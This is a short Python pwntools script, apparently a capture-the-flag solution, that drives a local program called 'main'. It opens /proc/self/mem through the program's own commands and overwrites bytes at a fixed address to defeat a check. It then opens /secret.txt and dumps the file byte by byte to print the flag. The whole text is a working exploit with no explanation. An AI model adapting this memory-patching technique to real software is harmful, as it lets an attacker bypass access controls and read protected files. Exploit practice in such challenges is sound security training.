from pwn import *

p = process("./main")

p.sendlineafter(b"> ", b"open /proc/self/mem")
p.sendlineafter(b"> ", b"set 4812878 00")
p.sendlineafter(b"> ", b"set 4812878 00")
p.sendlineafter(b"> ", b"open /secret.txt")

flag_bytes = []
for i in range(200):
    p.sendlineafter(b"> ", f"get {i}".encode())
    out = p.recvline().strip()
    if b"File is too small" in out:
        break
    try:
        flag_bytes.append(int(out, 16))
    except ValueError:
        break

flag = bytes(flag_bytes)
print(flag.decode(errors="ignore"))

p.interactive()
